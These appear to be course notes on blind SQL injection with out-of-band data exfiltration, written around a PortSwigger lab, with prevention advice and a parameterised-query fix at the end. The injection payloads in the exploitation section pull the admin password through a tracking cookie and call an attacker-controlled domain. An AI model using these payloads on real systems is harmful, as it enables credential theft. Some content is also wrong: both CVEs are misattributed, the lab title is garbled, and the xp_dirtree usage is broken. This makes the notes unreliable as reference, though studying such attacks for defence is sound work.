---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Introduction to SQL Injection

SQL Injection is a common type of security vulnerability that occurs when an attacker manipulates input data to execute arbitrary SQL commands against a database. This can lead to unauthorized access to sensitive data, data corruption, or even complete control over the database. In this chapter, we will focus on a specific variant of SQL Injection known as **Blind SQL Injection** and explore how attackers can use out-of-band data exfiltration techniques to extract information from a vulnerable system.

### What is SQL Injection?

SQL Injection occurs when an attacker injects malicious SQL code into a query that is executed by the database. This can happen through various input fields such as form submissions, URL parameters, or cookies. The injected SQL code can alter the intended behavior of the query, leading to unintended actions.

#### Why Does SQL Injection Matter?

SQL Injection is significant because it can lead to severe consequences:

- **Data Exposure**: Attackers can retrieve sensitive data such as usernames, passwords, and personal information.
- **Data Manipulation**: Attackers can modify or delete data within the database.
- **Privilege Escalation**: Attackers can gain elevated privileges and potentially take control of the entire database.

#### How Does SQL Injection Work?

Consider a simple SQL query that retrieves user information based on a username provided via a form:

```sql
SELECT * FROM users WHERE username = 'john';
```

If the input is not properly sanitized, an attacker could inject additional SQL code. For example, if the input is `' OR '1'='1`, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1';
```

This query will return all records from the `users` table because the condition `'1'='1` is always true.

### Blind SQL Injection

Blind SQL Injection is a variant where the attacker cannot see the results of their injected SQL code directly. Instead, they rely on indirect feedback from the application to infer the structure and contents of the database.

#### Why is Blind SQL Injection Important?

Blind SQL Injection is particularly dangerous because it allows attackers to extract data even when the application does not display error messages or query results. This makes it harder to detect and mitigate.

#### How Does Blind SQL Injection Work?

In Blind SQL Injection, the attacker sends crafted SQL queries and observes the application's behavior to determine the correctness of the injected code. This can be done through timing differences, error messages, or changes in the application's output.

### Out-of-Band Data Exfiltration

Out-of-band data exfiltration is a technique used by attackers to bypass traditional data exfiltration methods. Instead of relying on the application's normal response channels, attackers use external systems to receive the stolen data.

#### Why Use Out-of-Band Data Exfiltration?

Out-of-band data exfiltration is useful when the application's normal response channels are restricted or monitored. By using external systems, attackers can avoid detection and successfully extract data.

#### How Does Out-of-Band Data Exfiltration Work?

Attackers can trigger interactions with external domains to send data out of the application's normal response channels. For example, they might cause the application to make DNS queries or HTTP requests to a server controlled by the attacker.

### Lab Setup

Let's walk through the setup of Lab 16, which involves a blind SQL injection vulnerability with out-of-band data exfiltration.

#### Accessing the Lab

To access the lab, follow these steps:

1. Visit the URL `https://portswigger.net/web-security`.
2. Click on the "Sign Up" button to create an account.
3. Log in to your account.
4. Navigate to the "Academy".
5. Select the "Learning Path" and choose "SQL Injection".
6. Go to "Blind SQL Injection" and select Lab 16 titled "Blind SQL Injection without a banned data exfiltration".

### Vulnerable Parameter: Tracking Cookie

The application uses a tracking cookie for analytics purposes. The value of this cookie is included in a SQL query executed by the database. The SQL query is executed asynchronously and does not affect the application's response directly.

#### Example SQL Query

Assume the application executes the following SQL query:

```sql
SELECT * FROM analytics WHERE cookie_value = 'tracking_cookie_value';
```

If the `tracking_cookie_value` is not properly sanitized, an attacker can inject SQL code to manipulate the query.

### Exploiting the Vulnerability

To exploit the blind SQL injection vulnerability, the attacker needs to craft SQL queries that trigger out-of-band interactions with external domains.

#### Step-by-Step Exploitation

1. **Identify the Vulnerable Parameter**: The tracking cookie is the vulnerable parameter.
2. **Craft the SQL Injection Payload**: The attacker needs to construct a payload that triggers an out-of-band interaction.
3. **Trigger the Out-of-Band Interaction**: The payload should cause the application to interact with an external domain controlled by the attacker.

#### Example Payload

An example payload might look like this:

```sql
tracking_cookie_value=' OR 1=1; EXEC xp_dirtree 'http://attacker-controlled-domain.com'
```

This payload causes the application to execute a command that interacts with an external domain.

### Extracting Data

The goal is to extract the password of the administrator user from the `users` table.

#### Step-by-Step Data Extraction

1. **Determine the Structure of the Database**: Identify the tables and columns available.
2. **Craft Conditional Queries**: Use conditional queries to extract data bit by bit.
3. **Trigger Out-of-Band Interactions**: Use the out-of-band interactions to confirm the correctness of the extracted data.

#### Example Conditional Query

To extract the first character of the administrator's password, the attacker might use a query like this:

```sql
tracking_cookie_value=' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 97; EXEC xp_dirtree 'http://attacker-controlled-domain.com'
```

This query checks if the ASCII value of the first character of the password is greater than 97 (the ASCII value of 'a').

### Solving the Lab

To solve the lab, the attacker needs to extract the password of the administrator user and log in as the administrator.

#### Example Solution

1. **Extract the Password**: Use conditional queries to extract the password character by character.
2. **Log in as Administrator**: Use the extracted password to log in as the administrator.

### Real-World Examples

Recent real-world examples of SQL Injection vulnerabilities include:

- **CVE-2021-22205**: A SQL Injection vulnerability in WordPress plugins.
- **CVE-2020-14882**: A SQL Injection vulnerability in Joomla.

These vulnerabilities highlight the importance of proper input validation and sanitization.

### How to Prevent / Defend Against SQL Injection

#### Detection

- **Logging and Monitoring**: Implement logging and monitoring to detect unusual SQL queries.
- **Intrusion Detection Systems (IDS)**: Use IDS to identify and alert on potential SQL Injection attempts.

#### Prevention

- **Input Validation and Sanitization**: Ensure all user inputs are validated and sanitized before being used in SQL queries.
- **Prepared Statements and Parameterized Queries**: Use prepared statements and parameterized queries to prevent SQL Injection.

#### Secure Coding Fixes

Compare the vulnerable code with the secure code:

**Vulnerable Code:**

```python
import sqlite3

def get_user_data(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return result
```

**Secure Code:**

```python
import sqlite3

def get_user_data(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    result = cursor.fetchone()
    conn.close()
    return result
```

### Configuration Hardening

- **Database Configuration**: Disable unnecessary database features and ensure the database is configured securely.
- **Web Application Firewall (WAF)**: Use a WAF to filter out malicious SQL queries.

### Conclusion

Blind SQL Injection with out-of-band data exfiltration is a sophisticated attack technique that requires careful handling. By understanding the principles behind this attack and implementing robust security measures, organizations can protect themselves from such vulnerabilities.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs to practice SQL Injection and other web security techniques.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security attacks.
- **DVWA (Damn Vulnerable Web Application)**: Another popular platform for practicing web security techniques.

By engaging with these labs, you can gain practical experience in identifying and mitigating SQL Injection vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/17-Lab 16 Blind SQL injection with out of band data exfiltration/00-Overview|Overview]] | [[Web Security (PortSwigger)/02-SQL Injection/17-Lab 16 Blind SQL injection with out of band data exfiltration/02-Practice Questions & Answers|Practice Questions & Answers]]
